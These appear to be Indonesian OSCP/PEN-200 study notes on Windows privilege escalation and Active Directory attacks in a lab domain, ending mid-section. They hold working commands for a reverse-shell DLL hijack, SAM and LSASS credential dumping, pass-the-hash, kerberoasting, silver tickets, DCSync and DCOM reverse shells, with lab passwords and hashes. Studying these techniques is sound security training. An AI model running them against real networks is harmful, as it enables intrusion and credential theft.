Dan jika ada task yang berjalan dan melakukan eksekusi binary tertentu, kita bisa mengganti / replace binary dengan binary malicious yang kita buat dengan catatan binary tersebut writable 


#### Use exploit
Jadi module ini pada bagian terakhir membahas terkait dengan exploitation. jadi disini dibagi menjadi beberapa bagian, pertama kerentanan berbasis aplikasi yaitu jika aplikasi berjalan dengan hak administratif dan jika kita bisa mendapatkan command, maka seharusnya command kita akan dijalankan dari user yang menjalankannya.

kedua, yaitu menggunakan exploit kernel dan terakhir yakni penyalahgunaan hak akses pada windows itu sendiri.

Jika kita bahas bagian kernel exploit, maka akan ada banyak kondisi belum lagi harus disertakan PoC yang sesuai juga tapi jika kita berbicara mengenai penyalahgunaan hak akses, maka vector akan menjadi banyak, contohnya potensi hak akses yang bisa dimanfaatkan :

- SeImpersonatePrivilege
- _SeBackupPrivilege_
- _SeAssignPrimaryToken
- _SeLoadDriver_
- _SeDebug_

#### day 10


Di day 10 ini kita lebih ke mempraktekkan apa yang dipelajari sebelumnya dan harus mendapatkan flag.txt yang disimpan di directory enterpriseadmin, mungkin untuk singkatnya langsung by command aja :

```
//connect bind shell port 4444 dengan user diana
nc 192.168.219.222 4444

//masuk ke directory C:\Users\diana
//cari file sensitive 
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

//ditemukan file .txt, dan password dari user alex 
//masuk ke rdp 
xfreerdp3 /v:192.168.219.222 /u:alex
//dengan pass : WelcomeToWinter0121

//check services running non normal path
Get-CimInstance -ClassName Win32_Service | Where-Object -Property PathName -NotMatch @("Windows|Program Files") | Select-Object Name, ProcessId, PathName

//Ditemukan service EnterpriseService dengan directory writable
net stop EnterpriseService

//maka muncul logs atau bisa juga copy binary menggunakan impacket-smbserver

//di kali : sudo impacket-smbserver share . -smb2support -user kali -password kali

//di windows : net use x: \\192.168.45.208\share kali /user:kali

//grep string ".dll" pada EnterpriseService.exe 
strings EnterpriseService.exe | grep ".dll"
C:\Services\EnterpriseServiceLog.logCouldn't load EnterpriseServiceOptional.dll,

//create EnterpriseServiceOptional.dll menggunakan msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.208 LPORT=4444 -f dll -o reverse_shell.dll

//pindah pada C:\Services\EnterpriseServiceOptional.dll
//setelah itu listener aktifkan pada port 4444 dan restart service 

//in linux
nc -lnvp 4444

//in windows
net stop EnterpriseService.exe
net start EnterpriseService.exe

//dapat user enterprise user
whoami /all

//ada izin seBackupPrivilege, dapatkan SAM 
reg save hklm\system C:\Users\enterpriseuser\system.hive
reg save hklm\sam C:\Users\enterpriseuser\sam.hive


//lalu copy pada local kali
copy sam.hive x:\
copy system.hive x:\

//extract hash menggunakan impacket-secretsdump
impacket-secretsdump -sam sam.hive -system system.hive LOCAL 

//ambil hash administrator dan dengan evil-winrm untuk pass the hash
evil-winrm -i 192.168.219.222 -u Administrator -H 8f518eb35353d7a83d27e7fe457664e5 
```

#### day 11

Huuh akhirnya dari beberapa hari ini bisa untuk kembali belajar module pen-200, jadi langsung saja kita akan mempelajari module Introduction And Enumeration Active Directory. Disini kita akan belajar 3 aspek, yaitu
- Pengenalan Active Directory
- Active Directory Enumeration using manual tools
- Enumeration Active Directory using automation tools


Active Directory merupakan suatu layanan yang memungkinknan administrator untuk mengelola semua informasi tentang group, computer aplikasi, data access, sistem operasi dengan skala besar. Semua komponen pada Active Directory disebut sebagai object. AD bergantung pada DNS karena itu domain controller pada umumnya memiliki server DNS sendiri yang bertindak sebagai autoritative untuk domain tertentu.

Untuk mempermudah pengelolaan object, administrator bisa menggunakan OU(Organization Unit). OU bisa dibilang filesystem folder karena merupakan wadah yang digunakan untuk menyimpan suatu object. Computer Object merupakan server dan workstation, sementara user object merupakan user yang terhubung pada domain.

ada permasalah umum saat connect ke RDP, yang intinya kesalahan negosiasi protokol yang mana windows memerlukan authentikasi tingkat jaringan (NLA) tapi xfreerdp3 tidak menyediakan dengan benar, dan untuk mengatasi hal ini kita bisa menambahkan argument /sec:nla

```
xfreerdp3 /u:stephanie /d:corp.com /v:192.168.203.75 /sec:nla
```


Enumeration awal :

```
//cek user domain
net user /domain

//cek group domain
net group /domain

//cek user dalam group
net group "nama_group" /domain
```


#### Enumeration Active Directory using powershell and .NET

Enumerasi AD bergantung pada LDAP karena LDAP merupakan controller untuk berkomunikasi dengan Active Directory. Komunikasi LDAP dengan AD tidak se simple itu, jadi kita akan memanfaatkan ADSI(Active Directory Services Interface).

Dokumentasi microsoft, kita perlu LDAP ADsPath

```
LDAP://HostName[:PortNumber][/DistinguishedName]
```
Agar enumerasi bisa akurat, kita perlu mencari DC yang valid dan dikenal dengan PDC(Primary Domain Controller). Hanya ada 1 PDC pada domain, dan untuk menemukannya kita perlu DC yang memegang properti PdcRoleOwner.

DistinguishedName merupakan bagian path pada LDAP. DN merupakan unique name untuk identifikasi object pada AD. sebagai contoh, DN mungkin terlihat seperti ini 

```
CN=Stephanie,CN=Users,DC=corp,DC=com
```
- CN : Common Name
- DC : Domain Component

Domain Component mewakili root tree LDAP dan dalam hal ini kita menyebutnya sebagai Distinguished Name.

Kita bisa memanfaatkan powershell untuk enum awal, dengan memanfaatkan class .NET pada namespace System.DirectoryServices.ActiveDirectory.Domain dengan method GetCurrentDomain()

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

Disini mengungkap PdcRoleOwner yang menunjuk ke DC1.corp.com dan untuk membuat suatu script powershell untuk menyusun path lengkap pada LDAP sebagai berikut:

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name

$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"
$LDAP

//selanjutnya : powershell -ep bypass
//execute : .\enumeration.ps1

//output : LDAP://DC1.corp.com/DC=corp,DC=com
```

Setelah kita dapat menyusun path LDAP lengkap, sekarang kita akan membangun fungsi searching dan untuk ini kita akan menggunakan class DirectoryEntry dan DirectorySearcher. DirectoryEntry bertindak untuk merangkum semua object dalam hierari AD dan DirectorySearcher melakukan query pada AD. Contoh simple : 

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name

$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```

Disini akan menampilkan semua object pada AD, untuk itu kita perlu melakukan filter SamAccountType, yang merupakan attribute untuk semua user object, computer dan group.

Caranya cukup mudah, kita hanya perlu menambahkan $dirsearcher.filter :
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()
```

untuk menampilkan attribute dari user object 

```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result) {
	Foreach($prop in $obj.Properties) {
		$prop
	}

	Write-Host "---------------------------"
}
```

Selain itu, untuk lebih flexible kita juga bisa membuatnya menjadi suatu function : 

```
//function.ps1

function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

Lalu kita import dengan command : import-module .\function.ps1 dan kita bisa langsung memanggiilnya pada console powershell 

```
LDAPSearch -LDAPQuery "(samAccountType=805306368)"

//check group 
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel))"

//check specific properties
(LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Billing))").properties.member

//filter user
(LDAPSearch -LDAPQuery "(name=michelle)").properties
```


#### PowerView
Diatas kita mencoba membuat automation manual menggunakan powershell scriptin / .NET, tapi ada satu tools auto lain yang sangat powerfull yaitu PowerView

```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

jadi tinggal kita download dan lakukan import-module 

```
import-module .\powerview.ps1


//Informasi domain
Get-NetDomain

//informasi semua user
Get-NetUser


//informasi SPN pada AD
Get-NetUser -Spn | select serviceprincipalname

//grep attribute pada user
Get-NetUser | select cn

//grep multi attribute
Get-NetUser | select cn,pwdlastset,lastlogon


//Check group
Get-NetGroup | select cn


//Check specific user
 Get-NetUser -SamAccountName fred
```

Documentation : 
https://powersploit.readthedocs.io/en/latest/Recon/



#### day 12

Masih di Active Directory enumeration, jadi kita akan belajar banyak enumerasi yang dilakukan seperti grab sistem opearasi hingga mendapatkan domain shares. 

Kita bisa mengumpulkan machine / workstatiun apa saja yang digunakan pada AD dengan :

```
Get-NetComputer | select operatingsystem, dnshostname
```

Setelah kita mendapatkan akses user tertentu pada domain, tujuan kita yakni melakukan peningkatan hak akses maupun menemukan informasi berharga. Command yang digunakan untuk melihat apakah user kita memiliki akses ke komputer lain pada domain bisa menggunakan command powerview :

```
Find-LocalAdminAccess
```
Command ini menggunakan fungsi OpenServiceW yang akan terhubung pada SCM(Service Control manager) pada machine target. jadi 2 API windows yang dapat membantu saat melakukan enumerasi ini yaitu NetWkstaUserEnum dan NetSessionEnum dan command Get-NetSession pada powerview menggunakan 2 API tersebut.

Contoh untuk cek session pada komputer lain dalam AD: 

```
Find-LocalAdminAccess 

//output : client74.corp.com

//Kita bisa lanjut cek session
Get-NetSession -ComputerName files04 -Verbose
Get-NetSession -ComputerName web04 -Verbose 
```
Dan izin untuk enumerasi session tersebut di definisikan pada key SrvsvcSessionInfo yang terletak pada hive HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity dan kita juga bisa cek detail informasi seperti : 

```
Get-Acl -path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity | fl
```
Namu secara default, user dalam domain tidak berhak mendapatkan informasi ini dan membaca key registry **SrvsvcSessionInfo** kecuali pada windows versi lama.

Dan untungnya ada tools lain dari Sysinternal suite yaitu PsLoggedON dan tools ini melakukan enumerasi pada key dibawah HKEY_USERS untuk mengambil SID dan PSLoggedOn juga menggunakan API _NetSessionEnum_. Salah satu keterbatasan tools ini yaitu bergantung pada Remote Registry yang harus di enable.

```
.\PsLoggedon.exe \\files04
```


#### Enumeration melalui SPN(Service principal name)

Aplikasi pada AD harus dijalankan dalam konteks user dalam OS. Jadi aplikasi yang isolated dapat menggunakan service account yang ditentukan seperti LocalSystem, LocalService dan NetworkService.

Ketika aplikasi seperti Exchange, MS SQL dan IIS di integrasikan kedalam AD, ada identifikasi unik yang disebut SPN yang mengaitkan service akun tersebut dengan service tertentu pada AD. Kita juga dapat memperoleh IP dan port pada aplikasi yang berjalan dengan enumerasi SPN.

Check spn pada user iis_service 
```
setspn -L iis_service
```

Kita juga bisa enum SPN dengan PowerView untuk enumerasi semua akun domain 

```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

Dan dengan nslookup, kita dapat mengetahui IP yang digunakan pada host spn
```
nslookup.exe web04.corp.com
```


#### Object permission
Sebuah object di AD memiliki serangkaian izin yang diterapkan dengan beberapa ACE(Access Control Entry) dan ACE ini membentu ACL(Access Control List). Setiap ACE bertindak untuk menentukan akses ke object diizinkan atau ditolak.

Misalkan user mengakses suatu object pada domain, dan object target akan melakukan validasi berdasarkan ACL untuk menentukan user tersebut diizinkan atau ditolak. Dan kumpulan daftar izin ACE sebagai berikut :

```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

Untuk enumerasi ACE, kita dapat menggunakan Get-ObjectAcl 

```
Get-ObjectAcl -Identity stephanie
```

Akan ada banyak output, tapi yang penting disini kita hanya perlu memfilter Security Identifier(SID) dan ObjectSID serta ActiveDirectoryRight(izinnya), yang dimana hal ini juga sangat sulit dibaca dan untuk membacanya kita perlu melakukan konversi menggunakan command Convert-SidToName

```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

//output:
CORP\stephanie

```

Dan kita juga perlu untuk melakukan konversi SecurityIdentifier ke nama yang dapat dibaca 

```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553

//output : 
CORP\RAS and IAS Servers

```

dalam hal ini RAS and IAS Servers memiliki izin ActiveDirectoryRight(ReadPropery) pada user kita(stpehanie). 

Izin akses tertinggi pada suatu object yaitu GenricAll, dan selanjutnya kita akan hitung group _Departemen Manajemen_ 

```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

Kita select 2 property yaitu securityidentifier dan activedirectoryrights, dan setelah itu kita lakukan konversi semua SecutiryIdentifier ke nakma yang bisa dibaca.

```
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

//output: 
CORP\Domain Admins
COP\stephanie
...
```

Jadi pada group Management Department, terdapat izin genericall pada user stephanie, jadi artinya kita bisa melakukan apapun pada group management department melalui user stephanie

```

//add domain
net group "Management Department" stephanie /add /domain

//get member
Get-NetGroup "Management Department" | select member

//delete member
net group "Management Department" stephanie /del /domain
```


#### Domain Share

Domain share seringkali berisi informasi sensitif tentang environment target, dan kita akan menggunakan command powerview: 

```
Find-DomainShare

//or

Find-DomainShare -CheckShareAccess
```

akan ada banyak output yang ditampilkan, dan fokusnya adalah pada share SYSVOL, karena termasuk file dan folder yang berada pada domain controller itu sendiri dan share SYSVOL digunakan untuk berbagi policy dan domain script. Tiap pengguna mempunyai akses ke SYSVOL.

```
ls \\dc1.corp.com\sysvol\corp.com\

ls \\dc1.corp.com\sysvol\corp.com\Policies\
```

Jika beruntuk atau target memakai windows lama, bisa saja terdapat xml files seperti contoh dibawah : 

```
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

Dengan isi password enkripsi yang di hardcoded, dan secara historis administrator mengubah password melalui GPP(Group Policy Preferences). Hal ini, kita bisa melakukan dekripsi menggunakan gpp-decrypt pada kali 

```

//in kali
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"

//output : P@$$w0rd
```


#### Automation Enumeration sharphound & bloodhound
Sejauh ini kita lakukan enumerasi manual, dan untuk memangkas waktu kita bisa menggunakan tools powerfull yang digunakan untuk analisis automation.

Disini kita akan menggunakan sharphound untuk mengumpulkan data, dan sharphound sendiri menggunakan fungsi windows API dan namespace LDAP. sharphound tersedia dalam format berbeda seperti .exe maupun powershell dan bahkan kita bisa melakukan compile sendiri.

https://github.com/SpecterOps/SharpHound/releases/download/v2.9.0/SharpHound_v2.9.0_windows_x86.zip

Download zip dan pindahkan pada machine windows. Selanjutnya import module sharphound

```
import-module .\Sharphound.ps1

//tampilkan opsi
Get-Help Invoke-Bloodhound

//kumpulkan data 
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"

//secara default, sharphound mengumpulkan dalam bentuk JSON.
```

Setelah dikumpulkan, kemudian kita bisa menggunakan bloodhound untuk melakukan analysis.


#### day 13

Sekarang di module baru, yaitu Attacking Active Directory Authentication. jadi kita akan belajar terkait : 
- Authentication NTLM
- Authentication Keberos
- Penggunaan credential AD dalam cache

NTLM digunakan ketika client melakukan authentikasi ke server berdasarkan IP address bukan host. Jadi proses authnya seperti ini :
- Client calculate hash kriptografi yang disebut NTLM dan password user
- Client send username ke server
- server meresponse dengan value acak(nonce/challenge)
- Client melakukan enkripsi nonce dengan hash NTLM dan send ke server
- Server mem-forward response beserta username dan nonce ke domain controller
- Domain controller melakukan enkripsi nonce dengan NTLM user dan membandingkannya
- jika success maka authentikasi berhasil


Sekarang masuk ke kerberos, yang sama sama merupakan protokol authentikasi pada windows. perbedaan utamanya dengan NTLM yaitu jika pada NTLM, client memulai authentikasi dengan server aplikasi itu sendiri sementara kerberos melibatkan penggunaan KDC(Key Distribution Center).

Proses authentikasi kerberos :
- Client mengirim permintaan auth(AS-REQ) yang dikirim ke domain controller
- Domain Controller bertindak sebagai KDC dan AS-REQ berisi hash user
- Domain Controller menerima request, dan mencari hash user pada file ntds.dit
- Jika proses dekripsi berhasil, authentikasi success namun jika duplikat kemungkinan besar ada proses serangan(replay attack)
- Selanjutnya, Domain Controller mereseponse ke client(AS-REP) yang berisi session key dan TGT
- session key di enkripsi dengan password client dan didekripsi pada client
- untuk menghindari manipulation, TGT di enkripsi dengan hash akun krbtgt yang hanya diketahui KDC
- Jika user ingin akses resource pada AD, user harus menghubungi KDC lagi dan meminta TGS
- Jika valid maka KDC akan meresponse dengan memberikan service ticket
- Lalu jika client akan mengakses aplikasi pada AD,  client akan mengirim AP-REQ
- Server aplikasi melakukan dekripsi srvvice ticket dan jika username cocok maka akses diberikan


Sekarang, lanjut ke proses dumping, jadi pada windows semua informasi credential dan login disimpan pada LSASS tapi saat melakukan dump lsass memerlukan higher privilege(system) oleh karena itu, kita perlu melakukan privilege escalation dulu dan mendapatkan akses privilege yang lebih tinggi


Untuk ini kita menggunakan mimikatz

```
//untuk mengaktifkan privilege dengan syarat SeDebugPrivilege ada
privilege::debug

//Untuk menampilkan semua credential user yang masuk pada machine kita pada LSASS
sekurlsa::logonpasswords

//Menampilkan semua ticket yang tersimpan pada memory
sekurlsa::tickets

```

#### Day 14


disini pada module attacking active directory kita mulai mempelajari teknik password spraying dan brute force. 

Pertama kita bisa melakukan spraying password dari local komputer yang compromised, dengan memanfaatkan LDAP dan ADSI. Tapi sebelum itu kita perlu cek penguncian akun pada windows menggunakan command : 

```

//cek akun dikunci setelah berapa percobaan masuk
net accounts
```

```

//script powershell manual
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

Kita juga bisa memanfaatkan Spray-passwords.ps1 dengan command : 

```
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

Kedua, kita bisa memanfaatkan protocol SMB dengan menggunakan crackmapexec dengan user yang sudah kita tentukan

```

//using list
crackmapexec smb 192.168.106.75 -u user.txt -p 'Nexus123!' -d corp.com --continue-on-success

//using single username
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com

//Jika output terdapat Pwn3d! berarti merupakan admin local
```

Ketiga, kita bisa menggunakan kerbrute yang dimana tools ini menggunakan TGT dan AS-REQ untuk memvalidasi password

```

//using linux dan IP kerbrute harus IP dari domain controller
./kerbrute passwordspray -d corp.com --dc 192.168.106.70  ~/oscp/attacking-active-directory-authentication/user.txt 'Nexus123!'


//windows 

./kerbrute_windows_amd64.exe passwordspray -d corp.com user.txt 'Nexus123!'
```


#### AS-REP Roasting

Tanpa pra auth kerberos, attacker dapat mengirim AS-REQ ke domain controller pada semua user dalam AD, dan setelah mendapat AS-REP, attacker bisa melakukan password attack secara offline. 

opsi ini dapat diaktifkan dengan melakukan enable _Do not require Kerberos preauthentication_ yang secara default di disable dan kita akan menggunakan tools impacket

```
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hash.asrep corp.com/pete


//no save to file
impacket-GetNPUsers -dc-ip 192.168.106.70 -request corp.com/pete

```

Setelah itu, baru dilakukan cracking password manual menggunakan hashcat

```
hashcat -m 18200 hash.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

```

Kita juga bisa menggunakan rubeus untuk serangan as-rep roasting secara local dengan command : 

```
.\Rubeus.exe asreproast /nowrap
```


#### Kerberoasting

Saat user ingin melakukan akses ke resource tertentu pada AD, user harus request service ticket ke domain controller dan validasi cek dilakukan pada langkah kedua pada resource tersebut, yang berarti kita dapat meminta service ticket apapun pada SPN ke DC dan service ticket dienkripsi menggunakan password dari SPN. Disini jika kita dapat melakukan request dan dekripsi pada service ticket artinya kita juga mendapatkan password dari SPN.

menggunakan rubeus, kita bisa langsung melakukan request service ticket :

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast


//no output file
.\Rubeus.exe kerberoast /nowrap
```

Selanjutnya, kita bisa melakukan decryption menggunakan hashcat
```
hashcat -m 13100 kerberos_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


//jika kita ingin menentukan rule sendiri dengan menambahkan 1
hashcat -m 13100 -r <(echo '$1') hash.txt wordlist.txt


//or 
echo '$1' > append_1.rule
//then
hashcat -m 13100 kerberos_hash /usr/share/wordlists/rockyou.txt -r append_1.rule --force  
```


#### day 15



Masih dalam module attacking authentication active directory, disini kita akan belajar terkait Silver Ticket.

Pada cara kerja kerberos, aplikasi server berjalan dalam konteks service account memerikza izin user dari  group member yang ada di service ticket. Ada yang namanya PAC(Privileged Account Certificate) yang merupakan opsi verifikasi SPN application dan Domain Controller yang jika diaktifkan user akan divalidasi oleh DC, dan pada serangan kali ini untungnya aplikasi jarang melakukan validas PAC.

Dengan password service account dan NTLM hash, kita bisa membuat service ticket sendiri untuk akses resource pada DC dan ticket yang dibuat khusus dikenal dengan silver ticket. Dan untuk membuat silver ticket kita perlu 
- SPN password hash
- Domain SID
- Target SPN

Sebagai contoh, jika kita akses spn web04
```
iwr -UseDefaultCredentials http://web04
```

output akan 401, atau tidak ada authorization. disini kita perlu menjalankan mimikatz as administrator untuk mendapatkan hash NTLM dari IIS_SERVICE 

```
privilege::debug
sekurlsa::logonpasswords
```

lalu kita perlu SID user, dengan command 
```
whoami /user

//output: corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
//user RID : 1105
//yang diambil : S-1-5-21-1987370270-658905905-1781884369
//merupakan SID domain


//or in powerview
Get-DomainSID
```
Lalu terakhir SPN yang akan kita targetkan, dalam contoh ini HTTP/web04.corp.com:80 dan setelah itu kita perlu menyediakan opsi :

- /sid : SID DOMAIN
- /domain : nama domain
- /target : nama spn yang ditargetkan
- /service : Protokol pada SPN
- /rc4 : hash NTLM
- /ptt : inject langsung ke memory

dengan semua command berikut : 

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /rc4:4d28cf5252d39971419580a51484ca09 /target:web04.corp.com /service:http /ptt /user:jeffadmin
```

get flag : 

```
(iwr -UseDefaultCredentials http://web04 -UseBasicParsing).Content
OS{d1da282728142680c76692a16d0587ca}
```


#### Domain Controller Synchronization

Pada environment production, biasanya domain controller lebih dari 1 untuk keperluan redundant. Untuk bekerja bersama, diperlukan Directory Replication Service(DRS) yang menggunakan replication untuk melakukan sync ke domain controller redundant. Untuk update object tertentu, domain controller menggunakan API IDL_DRSGetNCChanges.

Disini kita bisa mencoba mengirimkan update yang tidak sah ke domain controller dengan user privilege tinggi, dari situ kita bisa menyamar sebagai domain controller dan meminta kredensial user apapun dalam domain. serangan ini dikenal dengan dcsync attack.

kita bisa menggunakan mimikatz dan impacket-secretdump untuk hal ini :

```
lsadump::dcsync /user:corp\dave
```

Disini kita akan mencoba melakukan dump user dave, setelah itu kita copy hash ntlm dan cracking di local menggunakan hashcat

```
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
```

Kita juga bisa menggunakan impacket-secretsdump untuk hal ini, tapi yang harus diperhatikan yaitu kita melakukan request ke domain controllernya

```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.220.70
```



#### Lateral Movement in Active Directory

Jadi disini kita akan belajar tentang : 
- Understand WMI, WinRS, and WinRM Lateral Movement Techniques
- Abuse PsExec for Lateral Movement
- Learn about Pass The Hash and Overpass The Hash as Lateral Movement Techniques
- Misuse DCOM to Move Laterally



###### WinRm dan WinRs



WMI membuat process melalui method class win32_process dan berkomunikasi dengan RPC melalui port 135 untuk akses jarak jauh. 

Contoh command ini akan menjalankan calc.exe pada node 73
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```
dan jika masuk pada machine tsb maka akan melihat win32calc.exe muncul sebagai jen


Kita juga bisa membuat script powershell yang menjalankan WMI sebagai berikut:
```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'payload_revshell'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
Dimana script diatas digunakan untuk melakukan reverse shell


Selain menggunakan powershell, wmi juga di implementasikan menggunakna utilitas winrs(windows remote shell) dengan syarat domain user harus menjadi group administrator atau remote user management

```
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```


dalam powershell kita juga bisa memanggil seperti ini : 
```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.220.73 -Credential $credential

Enter-PSSession 1
```
Dimana kita bisa langsung melakukan spawning console langsung pada host target

###### PSEXEC

PsExec juga merupakan tools yang menyediakan eksekusi remote process pada host lain tapi dengan syarat berikut: 
- User harus melakukan authentikasi ke machine target
- Share  ADMIN$ harus tersedia
- file sharing dan printer harus enable

command : 
```
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

##### Pass the Hash

Pass the hash merupakan teknik authentikasi dengan menggunakan hash NTLM alih alih password plain-text, dan hanya berfungsi jika server menggunakan authentikasi NTLM yang bukan kerberos.

seperti pada psexec, pass the hash mempunyai syarat agar berhasil :
- port 445 harus aktif
- fitur sharing file dan printer windows harus aktif
- writable pada share ADMIN$

commandnya simple, kita bisa menggunakan impacket untuk inii
```
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73

impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.125.73
```
##### Overpass the Hash

Merupakan teknik yang menyalahgunakan hash NTLM untuk mendapatkan kerberos TGT, dan dengan TGT kita bisa mendapatkan TGS. Disini user yang ingin kita compromise harus terlebih dulu melakukan authentikasi pada machine. dengan itu maka credential otomatis dilakukan caching dan kita bisa ekstraksi dengan mimikatz. 

Langkah langkah sebagai berikut :
```
//dump(user dave)
sekurlsa::logonpasswords

//convert ntlm to TGT(user dave)
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

//in new session(user dave)
klist

//login interactive to files04(user jen) 
net use \\files04

//check ticket again(user dave)
klist

//Using psexec connect to \\files04(user dave)
.\PsExec.exe \\files04 cmd
```


##### Pass the ticket

Serangan ini memanfaaktan TGS dan melakukan export kembali di jaringan maupun host lain dan kemudian digunakan untuk authentikasi ke service tertentu. Jadi semacam menggunakan session user lain untuk melakukan akses ke service tertentu

Dibawah ini command yang digunakan untuk akses service web04 dari user jen ke user dave menggunakan kirbi file yang di ekstrak dari kerberos
```
//check access is denied
ls \\web04\backup 

//using mimikatz export ticket
privilege::debug
sekurlsa::tickets /export

//check .kirbi files 
dir *.kirbi

//find user which access to web04 and execute in mimikatz
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

//list ticket
klist

//then again access 
ls \\web04\backup
```



##### DCOM 
DCOM merupakan protokol yang sangat lama digunakan pada windows dimana komunikasinya menggunakan RPC pada port 135, dan dengan memanfaatkan DCOM kita bisa melakukan lateral movement

Menggunakan powershell kita bisa memanfaatkan dcom untuk akses ke machine lain dengan syarat kita mempunyai administrator privileges
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.125.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

//or reverse shell

 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e base64payload","7")
```


#### day 16

Masih pada attack authentication directory, disini kita belajar tentang golden ticket dan shadow copy. 

golden ticket merupakan serangan yang memanfaatkan hash krbtgt untuk mengakses semua resource domain. serangan ini memalsukan TGT dimana kita bisa menyatakan user dengan hak privilege rendah yang bisa kita ubah sebagai Domain Admins


akses ke DC dengan psexec akan access denied karena tidak ada izin.
```
